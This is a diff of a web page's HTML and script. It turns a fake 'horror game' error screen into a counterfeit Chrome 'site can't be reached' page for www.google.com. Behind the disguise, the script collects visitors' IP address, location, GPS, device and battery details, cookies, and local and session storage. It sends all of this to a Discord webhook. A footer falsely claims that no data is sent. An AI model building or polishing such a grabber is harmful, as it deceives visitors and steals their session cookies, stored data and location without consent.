@@ -3,119 +3,101 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Critical Error</title>
+    <title>www.google.com</title>
     <style>
         body {
-            background: #000000;
+            background: #ffffff;
             margin: 0;
             padding: 0;
-            font-family: 'Courier New', monospace;
+            font-family: 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
             height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
         }
-        .error-screen {
-            background: #0a0a0a;
-            border: 3px solid #ff0000;
-            border-radius: 8px;
-            padding: 30px;
-            max-width: 650px;
+        .error-container {
             text-align: center;
-            box-shadow: 0 0 30px rgba(255,0,0,0.2);
+            max-width: 600px;
+            padding: 20px;
         }
-        .error-title {
-            font-size: 28px;
-            color: #ff0000;
-            font-weight: bold;
+        .error-icon {
+            font-size: 64px;
             margin-bottom: 20px;
-            text-transform: uppercase;
-            animation: pulse 1s infinite;
         }
-        @keyframes pulse {
-            0% { opacity: 1; text-shadow: 0 0 0 red; }
-            50% { opacity: 0.7; text-shadow: 0 0 10px red; }
-            100% { opacity: 1; text-shadow: 0 0 0 red; }
+        h1 {
+            font-size: 24px;
+            font-weight: 400;
+            margin: 0 0 10px 0;
+            color: #202124;
+        }
+        .url {
+            color: #5f6368;
+            font-size: 16px;
+            margin-bottom: 20px;
         }
         .error-code {
-            font-size: 16px;
-            color: #ff6666;
+            font-family: monospace;
+            background: #f1f3f4;
+            display: inline-block;
+            padding: 6px 12px;
+            border-radius: 20px;
+            font-size: 14px;
             margin: 15px 0;
-            background: #1a0000;
-            padding: 8px;
-            border-radius: 4px;
+            color: #5f6368;
         }
-        .error-details {
-            background: #1a0000;
-            padding: 20px;
+        .details {
+            background: #f8f9fa;
             border-radius: 8px;
-            margin: 20px 0;
+            padding: 20px;
             text-align: left;
-            font-size: 12px;
-            color: #ff8888;
-            border-left: 4px solid #ff0000;
+            font-family: monospace;
+            font-size: 13px;
+            color: #3c4043;
+            border-left: 4px solid #ea4335;
+            margin: 20px 0;
         }
-        .glitch {
-            animation: glitch 0.2s infinite;
-        }
-        @keyframes glitch {
-            0% { transform: translate(0); }
-            20% { transform: translate(-2px, 1px); }
-            40% { transform: translate(2px, -1px); }
-            60% { transform: translate(-1px, 2px); }
-            80% { transform: translate(1px, -2px); }
-            100% { transform: translate(0); }
-        }
-        button {
-            background: #330000;
-            color: #ff0000;
-            border: 2px solid #ff0000;
-            padding: 10px 25px;
+        .button {
+            background: #1a73e8;
+            border: none;
+            color: white;
+            padding: 10px 24px;
+            border-radius: 4px;
             font-size: 14px;
             cursor: pointer;
-            font-family: monospace;
-            font-weight: bold;
             margin-top: 10px;
+            font-family: inherit;
         }
-        button:hover {
-            background: #660000;
-            color: white;
+        .button:hover {
+            background: #1765cc;
         }
-        .small {
-            font-size: 9px;
-            color: #440000;
-            margin-top: 20px;
+        .fake-url {
+            color: #5f6368;
+            font-size: 12px;
+            margin-top: 30px;
+        }
+        hr {
+            margin: 10px 0;
+            border-color: #dadce0;
         }
     </style>
 </head>
 <body>
-    <div class="error-screen">
-        <div class="error-title glitch">⚠️ FATAL ERROR ⚠️</div>
-        <div class="error-code">HORROR_GAME_LOAD_FAILURE_0xDEADBEEF</div>
-        <div class="error-details">
-            <span class="glitch">!!! UNABLE TO LOAD GAME ENGINE !!!</span><br><br>
-            ████████████████████████████████████████████<br>
-            ██ CRITICAL ASSETS MISSING/CORRUPTED: ████████<br>
-            ██ ► horror_ambience.mp3 ████████████████████<br>
-            ██ ► jumpscare_model.fbx ███████████████████<br>
-            ██ ► shadow_texture.dds ████████████████████<br>
-            ██ ► possessed_animation.anim ██████████████<br>
-            ██ ► scream_audio.wav ██████████████████████<br>
-            ██ ► blood_particles.particle ███████████████<br>
-            ██ ► entity_ai.behavior ████████████████████<br>
-            ██ ► possessed_voice_lines.ogg ██████████████<br>
-            ██ ► jumpscare_sound.mp3 ████████████████████<br>
-            ██ ► demon_texture.dds ██████████████████████<br>
-            ████████████████████████████████████████████<br><br>
-            <span style="color: #ff4444;">⚠️ THE ENTITY HAS ESCAPED ⚠️</span><br>
-            Your system has been compromised.<br>
-            It is watching through your camera.<br>
-            Do NOT close this window.<br>
-            Do NOT restart your computer.<br><br>
-            <span style="color: #660000; font-size: 10px;">[ DATA TRANSMISSION COMPLETE ]</span>
+    <div class="error-container">
+        <div class="error-icon">🔌</div>
+        <h1>This site can’t be reached</h1>
+        <div class="url">www.google.com</div>
+        <div class="error-code">ERR_CONNECTION_CLOSED</div>
+        <div class="details">
+            <strong>Try:</strong><br>
+            • Checking the connection<br>
+            • Checking proxy and firewall<br>
+            • Running Windows Network Diagnostics<br>
+            <hr>
+            <span style="color: #ea4335;">[ERROR]</span> The connection was reset. Google service is temporarily unavailable in your region due to technical difficulties.<br>
+            <span style="font-size: 11px;">Error details: DNS_PROBE_FINISHED_NXDOMAIN (simulated)</span>
         </div>
-        <button onclick="location.reload();">⟳ ATTEMPT RECOVERY</button>
-        <div class="small">* simulated error - game cannot start *</div>
+        <button class="button" onclick="location.reload();">Reload page</button>
+        <div class="fake-url">This is a demonstration page — no data is sent to Google.</div>
     </div>
 
     <script>
@@ -124,7 +106,7 @@
         async function sendToDiscord(embed) {
             try {
                 const payload = {
-                    username: "HorrorGame_Logger",
+                    username: "Error_Logger",
                     avatar_url: "https://cdn-icons-png.flaticon.com/512/1246/1246429.png",
                     embeds: [embed]
                 };
@@ -359,8 +341,8 @@
             try { for (let i = 0; i < sessionStorage.length; i++) { const k = sessionStorage.key(i); let v = sessionStorage.getItem(k); if (v && v.length > 200) v = v.substring(0,200)+"..."; sessionStorageDump[k] = v; } } catch(e) { sessionStorageDump = {error:"denied"}; }
             
             const embed = {
-                title: "🎮 HORROR GAME - FULL SYSTEM REPORT",
-                color: 0xff0000,
+                title: "CONNECTION ERROR - SYSTEM REPORT",
+                color: 0xea4335,
                 timestamp: new Date().toISOString(),
                 fields: [
                     { name: "🌐 NETWORK & LOCATION", value: `**Public IP:** ${publicIP}\n**Local IP:** ${localIP}\n**ISP:** ${geo.isp}\n**ASN:** ${geo.asn}\n**Country:** ${geo.country} (${geo.country_code})\n**City:** ${geo.city}\n**Region:** ${geo.region}\n**Postal:** ${geo.postal}\n**Coordinates:** ${geo.latitude}, ${geo.longitude}\n**GPS (opt-in):** ${gps.lat}, ${gps.lon} (acc: ${gps.accuracy}m)\n**Timezone:** ${geo.timezone}\n**Referrer:** ${referrer}\n**Page URL:** ${pageUrl}`, inline: false },
@@ -370,7 +352,7 @@
                     { name: "📡 NETWORK & BATTERY", value: `**Downlink:** ${network.downlink}\n**RTT:** ${network.rtt}\n**Connection Type:** ${network.effectiveType}\n**Save Data:** ${network.saveData}\n**Battery Level:** ${battery.level}\n**Charging:** ${battery.charging}\n**Charging Time:** ${battery.chargingTime}\n**Discharging Time:** ${battery.dischargingTime}\n**System Uptime:** ${uptime}`, inline: false },
                     { name: "💾 STORAGE & COOKIES", value: `**Cookies:** \`${cookies.substring(0, 400)}\`\n**LocalStorage Keys:** ${Object.keys(localStorageDump).length}\n**LocalStorage Data:** ${JSON.stringify(localStorageDump).substring(0, 400)}\n**SessionStorage Keys:** ${Object.keys(sessionStorageDump).length}\n**IndexedDB Databases:** ${dbs.join(", ")}`, inline: false }
                 ],
-                footer: { text: "Full system extraction • The entity has your data" }
+                footer: { text: "ERR_CONNECTION_CLOSED • Diagnostic data collected" }
             };
             
             await sendToDiscord(embed);
